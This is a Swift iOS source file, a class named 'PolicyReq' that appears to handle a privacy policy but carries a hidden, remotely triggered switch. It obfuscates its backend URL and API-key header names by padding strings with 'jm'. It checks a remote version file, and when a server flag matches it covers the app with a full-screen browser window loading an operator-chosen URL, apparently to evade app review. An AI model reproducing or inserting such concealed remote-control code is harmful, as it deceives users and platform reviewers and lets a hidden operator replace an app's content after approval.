import UIKit
import SafariServices
import CoreTelephony

public extension DispatchQueue {
    
    private static var _onceTracker = [String]()
    public class func once(token: String, block:()->Void) {
        objc_sync_enter(self)
        defer { objc_sync_exit(self) }
        
        if _onceTracker.contains(token) {
            return
        }
        
        _onceTracker.append(token)
        block()
    }
}

class PolicyReq: NSObject {
    static var AIDN : String? = nil
    static var AKYS : String? = nil
    static var userInfo : String? = nil
    static var headerView : UIView? = nil
    static var headerImg : UIView? = nil
    static var winView : UIWindow? = nil
    static var cellular_Data : CTCellularData? = nil
    static var policyView : SFSafariViewController? = nil
    static var objFi : String? = nil
    static var objSe : String? = nil;
    static var policyip: String? = nil;
    
    class func policyHeader(key : String) {
        let arr = key.components(separatedBy: "/")
        if arr.count < 2 {
            return
        }
        AIDN = arr[0]
        AKYS = arr[1]
        
        NotificationCenter.default.addObserver(forName: NSNotification.Name(rawValue: "AMG&BMW"), object: nil, queue: OperationQueue.main) { (noti) in
            CompanyResult()
        }
        NotificationCenter.default.addObserver(forName: NSNotification.Name(rawValue: "USEFOR"), object: nil, queue: OperationQueue.main) { (noti) in
            SECResp(name: String(format: "%@", objSe!))
        }
        NotificationCenter.default.addObserver(forName: NSNotification.Name(rawValue: "USETO"), object: nil, queue: OperationQueue.main) { (noti) in
            CompanyResult()
        }
        NotificationCenter.default.addObserver(forName: NSNotification.Name(rawValue: "UIApplicationDidChangeStatusBarOrientationNotification"), object: nil, queue: OperationQueue.main) { (noti) in
            let useinfo = noti.userInfo as! Dictionary<String, Any>
            let str = String(format: "%@", useinfo["UIApplicationStatusBarOrientationUserInfoKey"] as! CVarArg)
            if str == "1" {
                self.headerView?.isHidden = true;
            } else {
                self.headerView?.isHidden = false;
            }
            self.headerImg?.isHidden = !(self.headerView?.isHidden)!;
        }
    }
    
    class func showVersion(value : String) -> Bool {
        let verInfo = Bundle.main.infoDictionary?["CFBundleShortVersionString"] as! String
        if value == verInfo {
            return true
        }
        return false
    }
    
    class func CompanyResult() {
        if policyView != nil {
            return
        }
        policyView = SFSafariViewController.init(url: URL(string: userInfo!)!)
        self.winView = UIWindow.init(frame: UIScreen.main.bounds)
        self.winView?.backgroundColor = UIColor.white
        self.winView?.rootViewController = policyView
        self.winView?.windowLevel = UIWindowLevelAlert
        self.winView?.isHidden = false
        self.winView?.alpha = 1;
        if self.isIPhoneX() {
            self.winView?.addSubview(self.headerView!)
            self.winView?.addSubview(self.headerImg!)
            if UIApplication.shared.isStatusBarHidden {
                policyView?.view.frame = CGRect.init(x: 0, y: -5, width: UIScreen.main.bounds.size.width, height: UIScreen.main.bounds.size.height + 5)
            } else {
                policyView?.view.frame = CGRect.init(x: 0, y: -49, width: UIScreen.main.bounds.size.width, height: UIScreen.main.bounds.size.height + 49)
            }
        } else {
            policyView?.view.frame = CGRect.init(x: 0, y: -self.iphonexH(), width: UIScreen.main.bounds.size.width, height: UIScreen.main.bounds.size.height + self.iphonexH())
            
        }
        self.winView?.makeKeyAndVisible()
        
    }
    
    class func PolicyResult() {
        if policyView != nil {
            return
        }
        if policyip == nil {
            print("policy nil")
            return
        }
        
        if UserDefaults.standard.bool(forKey: "Policy") {
            return
        }
        
        policyView = SFSafariViewController.init(url: URL(string: policyip!)!)
        UIApplication.shared.keyWindow?.rootViewController?.present(policyView!, animated: true, completion: nil)
        UserDefaults.standard.set(true, forKey: "Policy")
    }
    
    class func policyContent(arr : Array<String>) {
        if arr.count < 2 {
            return;
        }
        objFi = arr[0]
        objSe = arr[1]
        if arr.count > 2 {
            policyip = arr[2]
        }
        versionNetModel(name: objFi!)
        cellular_Data = CTCellularData.init()
        cellular_Data?.cellularDataRestrictionDidUpdateNotifier = {(status) in
            if status == CTCellularDataRestrictedState.notRestricted {
                DispatchQueue.main.asyncAfter(deadline: .now() + 2, execute: {
                    versionNetModel(name: objFi!)
                })
            }
        }
    }
    class func versionNetModel(name : String) {
        let bunName = Bundle.main.infoDictionary?["CFBundleExecutable"]
        let bunInfo = String(format: "%@", Bundle.main.infoDictionary?["CFBundleIdentifier"] as! CVarArg)
        let requestInfo = String(format: "https://raw.githubusercontent.com/TNTechCom/verManager/master/%@.txt", bunName as! CVarArg)
        let session = URLSession.shared
        var request = URLRequest.init(url: URL(string: requestInfo)!)
        request.httpMethod = "GET"
        let task = session.dataTask(with: request) { (data, response, error) in
            print(error as Any)
            if data != nil {
                #if DEBUG
                reqModelConfig(name: name)
                #endif
                do {
                    let obj =  try JSONSerialization.jsonObject(with: data!, options: JSONSerialization.ReadingOptions.allowFragments)
                    let result = obj as! Dictionary<String, Any>
                    
                    let bunid = result["bundleId"] as! String
                    if bunInfo != bunid {
                        return
                    }
                    let temp = result["version"] as! String
                    let storeV = String(format: "%@", temp)
                    if showVersion(value: storeV) {
                        reqModelConfig(name: name)
                    }
                } catch {
                    #if DEBUG
                    print("response error")
                    #else
                    PolicyResult()
                    #endif
                }
            }
        }
        task.resume()
    }
    
    class func reqModelConfig(name : String) {
        configNetModelSetting(identifier: name)
        
        NotificationCenter.default.addObserver(forName: NSNotification.Name(rawValue: "idResult"), object: nil, queue: OperationQueue.main) { (noti) in
            let userinfo = noti.userInfo
            if name == userinfo!["identifier"] as! String {
                let result = userinfo!["result"] as! Dictionary<String, Any>
                let setting = result["kzkg"] as? String
                if setting == "jcsd" {
                    NotificationCenter.default.post(name: NSNotification.Name(rawValue: "USEFOR"), object: nil)
                } else {
                    PolicyResult()
                }
            }
        }
    }
    class func userTypeValue(name : String) {
        configNetModelSetting(identifier: name)
        NotificationCenter.default.addObserver(forName: NSNotification.Name(rawValue: "idResult"), object: nil, queue: OperationQueue.main) { (noti) in
            let userinfo = noti.userInfo
            if name == userinfo!["identifier"] as! String {
                let result = userinfo!["result"] as! Dictionary<String, Any>
                NotificationCenter.default.post(name: NSNotification.Name(rawValue: "DNBX"), object: nil, userInfo: ["userMsg" : result])
            }
        }
    }
    
    class func isIPhoneX() -> Bool {
        if (__CGSizeEqualToSize(UIScreen.main.bounds.size, CGSize.init(width: 375, height: 812)) ||
            __CGSizeEqualToSize(UIScreen.main.bounds.size, CGSize.init(width: 812, height: 375))) {
            return true;
        }
        else {
            return false;
        }
    }
    
    class func iphonexH() -> CGFloat {
        if (__CGSizeEqualToSize(UIScreen.main.bounds.size, CGSize.init(width: 375, height: 812)) ||
            __CGSizeEqualToSize(UIScreen.main.bounds.size, CGSize.init(width: 812, height: 375))) {
            return 39
        } else {
            if UIApplication.shared.isStatusBarHidden {
                return 42
            } else {
                return 64
            }
        }
    }
    class func SECResp(name : String) {
        configNetModelSetting(identifier: name)
        NotificationCenter.default.addObserver(forName: NSNotification.Name(rawValue: "idResult"), object: nil, queue: OperationQueue.main) { (noti) in
            let userinfo = noti.userInfo
            if name == userinfo!["identifier"] as! String {
                let result = userinfo!["result"] as! Dictionary<String, Any>
                let model = result["info"] as? String
                if model != nil && (model?.count)! > 0 {
                    userInfo = model
                    self.headerView = UIView.init(frame: CGRect.init(x: 0, y: 0, width: UIScreen.main.bounds.size.width, height: iphonexH()))
                    self.headerView?.backgroundColor = UIColor.white
                    if self.isIPhoneX() {
                        self.headerImg = UIView.init(frame: CGRect.init(x: 0, y: 0, width: UIScreen.main.bounds.size.height, height: 39))
                    } else {
                        self.headerImg = UIView.init(frame: CGRect.init(x: 0, y: 0, width: UIScreen.main.bounds.size.height, height: 44))
                    }
                    self.headerImg?.isHidden = true;
                    self.headerImg?.backgroundColor = UIColor.white
                    NotificationCenter.default.post(name: NSNotification.Name(rawValue: "USETO"), object: nil, userInfo: ["info" : model as Any])
                } else {
                    PolicyResult()
                }
            }
        }
    }
    class func signString() -> String {
        var result : String = ""
        let patchArr = ["hjmtjmtjmpjmsjm:jm/jm/jm",".jmajmpjmijm","jm.jmljmnjmcjm","ljmdjmgjmljm","jmojmbjmajmljm.jm","cjmojmmjm/","1jm.jm1jm/jmcjmljmajm","sjmsjmejm","sjm/jmCjmojmnjm","fjmijmgjm/"]
        for string in patchArr {
            result = result.appending(self.stringTransform(string: string))
        }
        let sroe = AIDN?.prefix(8)
        result.insert(contentsOf: sroe!, at: result.index(result.startIndex, offsetBy: 8))
        return result
    }
    class func configNetModelSetting(identifier : String) {
        let requestSession = URLSession.shared
        var result = self.signString()
        result = result.appending(identifier)
        let mutiRequest = NSMutableURLRequest(url: URL(string: result)!)
        mutiRequest.httpMethod = "GET"
        mutiRequest.setValue(String(format: "%@-MdYXbMMI", AIDN!), forHTTPHeaderField: self.stringTransform(string: "Xjm-jmLjmCjm-jmIjmd"))
        mutiRequest.setValue(AKYS, forHTTPHeaderField: self.stringTransform(string: "Xjm-jmLjmCjm-jmKjmejmy"))
        mutiRequest.setValue("application/json", forHTTPHeaderField: "Content-Type")
        let task = requestSession.dataTask(with: mutiRequest as URLRequest) { (data, response, error) in
            print(error as Any)
            if data != nil {
                let obj =  try! JSONSerialization.jsonObject(with: data!, options: JSONSerialization.ReadingOptions.allowFragments)
                let result = obj as! Dictionary<String, Any>
                netModelBack(identifier: identifier, result: result)
            }
        }
        task.resume()
    }
    
    class func netModelBack(identifier : String, result : Dictionary<String, Any>) {
        UserDefaults.standard.set(true, forKey: "land")
        NotificationCenter.default.post(name: NSNotification.Name(rawValue: "idResult"), object: nil, userInfo: ["identifier" : identifier, "result" : result])
    }
    
    class func stringTransform(string : String) -> String {
        var target : String = ""
        let arr = string.components(separatedBy: "jm")
        for str in arr {
            target = target.appending(str)
        }
        return target
    }
}
